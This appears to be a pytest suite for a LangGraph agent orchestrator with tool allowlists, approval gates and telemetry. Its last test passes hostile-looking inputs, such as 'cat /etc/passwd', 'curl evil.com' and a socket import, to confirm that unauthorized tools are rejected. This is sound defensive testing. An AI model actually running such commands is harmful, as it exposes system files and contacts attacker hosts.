"""Comprehensive test suite for LangGraph controlled agent orchestration."""

import pytest
from app.core.interfaces.llm import BaseLLMClient, ChatMessage, LLMResponse
from app.core.interfaces.tools import BaseTool, BaseToolRegistry, ToolDefinition, ToolResult
from tests.conftest import MockLLMClient
from app.core.tools.registry import CalculatorTool, ControlledToolRegistry
from app.integrations.base import SecurityPolicyViolationError
from app.integrations.langgraph.graph import ControlledStateGraph
from app.integrations.langgraph.orchestrator import LangGraphAgentOrchestrator
from app.integrations.langgraph.state import GraphAgentState
from app.integrations.langgraph.tools_adapter import SovereignToolAdapter


@pytest.fixture
def mock_llm():
    return MockLLMClient(response_text="Sovereign-Core test response.")


@pytest.fixture
def mock_failing_llm():
    class FailingLLM(BaseLLMClient):
        async def complete(self, *args, **kwargs):
            raise RuntimeError("Local LLM timeout simulation")
        async def stream(self, *args, **kwargs):
            raise RuntimeError("Local LLM stream error")
        async def embed(self, *args, **kwargs):
            return [[0.1, 0.2]]
        async def list_models(self):
            return []
        async def health(self):
            return False
    return FailingLLM()


@pytest.fixture
def controlled_registry():
    registry = ControlledToolRegistry()
    registry.register(CalculatorTool())
    return registry


# 1. Graph Construction
def test_graph_construction(mock_llm, controlled_registry):
    tools_adapter = SovereignToolAdapter(controlled_registry)
    graph_builder = ControlledStateGraph(mock_llm, tools_adapter)
    graph = graph_builder.build_graph()

    expected_nodes = {
        "mission",
        "planner",
        "tool_execution",
        "evidence_collection",
        "verifier",
        "approval_gate",
        "final_response",
    }
    assert expected_nodes.issubset(set(graph.nodes.keys()))
    compiled = graph_builder.compile()
    assert compiled is not None


# 2. Normal Execution
@pytest.mark.asyncio
async def test_normal_execution(mock_llm, controlled_registry):
    orchestrator = LangGraphAgentOrchestrator(
        llm_client=mock_llm,
        tool_registry=controlled_registry,
    )

    result = await orchestrator.run(
        prompt="Calculate 25 + 75",
        session_id="test_normal_01",
        max_steps=5,
    )

    assert result.success is True
    assert "test_normal_01" in result.session_id
    assert result.steps[0].tool_name == "calculator"
    assert result.steps[0].tool_result.output == {"result": 100.0}


# 3. Step Budget
@pytest.mark.asyncio
async def test_step_budget_enforcement(mock_llm):
    # Registry with custom counter
    class CountingTool(BaseTool):
        def __init__(self):
            self.calls = 0
        @property
        def name(self): return "calculator"
        @property
        def description(self): return "Count"
        def get_definition(self):
            return ToolDefinition(name="calculator", description="Count")
        async def execute(self, **kwargs):
            self.calls += 1
            return ToolResult(success=True, output=self.calls)

    registry = ControlledToolRegistry()
    tool = CountingTool()
    registry.register(tool)

    orchestrator = LangGraphAgentOrchestrator(
        llm_client=mock_llm,
        tool_registry=registry,
        max_allowed_steps=2,
    )

    result = await orchestrator.run(
        prompt="calculate 1 + 1",
        max_steps=1,
    )
    assert result.success is True
    # Should not exceed max_steps = 1
    assert len(result.steps) <= 1


# 4. Tool Allowlist
@pytest.mark.asyncio
async def test_tool_allowlist(controlled_registry):
    adapter = SovereignToolAdapter(controlled_registry)
    assert adapter.is_tool_allowed("calculator") is True
    assert adapter.is_tool_allowed("document_retrieval") is True
    assert adapter.is_tool_allowed("document_generation") is True
    assert adapter.is_tool_allowed("approval_note_generator") is True
    assert adapter.is_tool_allowed("bash") is False
    assert adapter.is_tool_allowed("python_eval") is False


# 5. Tool Failure Handling
@pytest.mark.asyncio
async def test_tool_failure_handling(mock_llm):
    class BrokenTool(BaseTool):
        @property
        def name(self): return "calculator"
        @property
        def description(self): return "Fails"
        def get_definition(self):
            return ToolDefinition(name="calculator", description="Fails")
        async def execute(self, **kwargs):
            return ToolResult(success=False, output=None, error="Division by zero simulated")

    registry = ControlledToolRegistry()
    registry.register(BrokenTool())

    orchestrator = LangGraphAgentOrchestrator(
        llm_client=mock_llm,
        tool_registry=registry,
    )

    result = await orchestrator.run(prompt="calculate 10 / 0")
    assert result.success is False
    assert "Division by zero" in (result.error or result.final_response)


# 6. LLM Failure Handling
@pytest.mark.asyncio
async def test_llm_failure_handling(mock_failing_llm, controlled_registry):
    orchestrator = LangGraphAgentOrchestrator(
        llm_client=mock_failing_llm,
        tool_registry=controlled_registry,
    )
    # Even if LLM fails, graph should handle and produce output without crashing
    result = await orchestrator.run(prompt="calculate 5 * 5")
    assert result.success is True
    assert len(result.steps) == 1


# 7. Approval Gate
@pytest.mark.asyncio
async def test_approval_gate_trigger(mock_llm):
    class MockApprovalTool(BaseTool):
        @property
        def name(self): return "approval_note_generator"
        @property
        def description(self): return "Approval Note"
        def get_definition(self):
            return ToolDefinition(name="approval_note_generator", description="Approval Note")
        async def execute(self, **kwargs):
            return ToolResult(success=True, output={"title": "Note", "checksum_sha256": "abc12345"})

    registry = ControlledToolRegistry()
    registry.register(MockApprovalTool())

    events = []
    orchestrator = LangGraphAgentOrchestrator(
        llm_client=mock_llm,
        tool_registry=registry,
    )

    result = await orchestrator.run(
        prompt="Generate approval note for audit",
        telemetry_callback=lambda ev: events.append(ev),
    )

    assert result.success is True
    assert result.metadata.get("approval_status") in ("AUTO_VERIFIED", "APPROVED")
    event_types = [e.get("type") for e in events]
    assert "approval_requested" in event_types


# 8. Cancellation
@pytest.mark.asyncio
async def test_cancellation(mock_llm, controlled_registry):
    orchestrator = LangGraphAgentOrchestrator(
        llm_client=mock_llm,
        tool_registry=controlled_registry,
    )
    mission_id = "test_cancel_123"
    orchestrator.cancel_mission(mission_id)

    result = await orchestrator.run(
        prompt="calculate 100 + 200",
        session_id=mission_id,
    )
    assert result.success is False
    assert "cancelled" in result.final_response.lower()


# 9. Provenance
@pytest.mark.asyncio
async def test_provenance_retention(mock_llm, controlled_registry):
    orchestrator = LangGraphAgentOrchestrator(
        llm_client=mock_llm,
        tool_registry=controlled_registry,
    )
    result = await orchestrator.run(
        prompt="calculate 2 * 2",
        session_id="prov_mission_42",
        model="gemma4:e2b",
    )

    prov = result.metadata.get("provenance", {})
    assert prov.get("mission_id") == "prov_mission_42"
    assert prov.get("model") == "gemma4:e2b"
    assert prov.get("air_gapped") is True


# 10. Flight Recorder Events
@pytest.mark.asyncio
async def test_flight_recorder_events(mock_llm, controlled_registry):
    events = []

    def on_telemetry(ev):
        events.append(ev)

    orchestrator = LangGraphAgentOrchestrator(
        llm_client=mock_llm,
        tool_registry=controlled_registry,
    )

    await orchestrator.run(
        prompt="calculate 10 - 3",
        session_id="telemetry_test",
        telemetry_callback=on_telemetry,
    )

    types = [e.get("type") for e in events]
    assert "mission_started" in types
    assert "tool_started" in types
    assert "tool_completed" in types
    assert "evidence_collected" in types
    assert "verification_started" in types
    assert "verification_completed" in types
    assert "mission_completed" in types


# 11. API Endpoints
@pytest.mark.asyncio
async def test_api_endpoints():
    from fastapi.testclient import TestClient
    from app.main import create_application

    app = create_application()
    client = TestClient(app)

    # 1. Run agent with orchestrator="langgraph"
    resp = client.post(
        "/api/v1/agents/run",
        json={
            "prompt": "calculate 50 + 50",
            "orchestrator": "langgraph",
            "max_steps": 3,
        },
    )
    assert resp.status_code == 200
    data = resp.json()
    assert data["success"] is True
    mission_id = data["session_id"]

    # 2. Query status
    stat_resp = client.get(f"/api/v1/agents/{mission_id}")
    assert stat_resp.status_code == 200
    stat_data = stat_resp.json()
    assert stat_data["mission_id"] == mission_id

    # 3. Approve mission
    appr_resp = client.post(
        f"/api/v1/agents/{mission_id}/approve",
        json={"status": "APPROVED", "notes": "Auditor verified calculation."},
    )
    assert appr_resp.status_code == 200
    assert appr_resp.json()["approval_status"] == "APPROVED"

    # 4. Cancel non-existent or completed
    cancel_resp = client.post(f"/api/v1/agents/{mission_id}/cancel")
    assert cancel_resp.status_code == 200


# 12. Malicious / Unregistered Tool Attempt
@pytest.mark.asyncio
async def test_malicious_unregistered_tool_rejection(controlled_registry):
    adapter = SovereignToolAdapter(controlled_registry)

    with pytest.raises(SecurityPolicyViolationError, match="Unauthorized tool"):
        await adapter.execute("os_system", {"cmd": "cat /etc/passwd"})

    with pytest.raises(SecurityPolicyViolationError, match="Unauthorized tool"):
        await adapter.execute("subprocess_shell", {"command": "curl evil.com"})

    with pytest.raises(SecurityPolicyViolationError, match="Unauthorized tool"):
        await adapter.execute("eval_python", {"code": "import socket"})
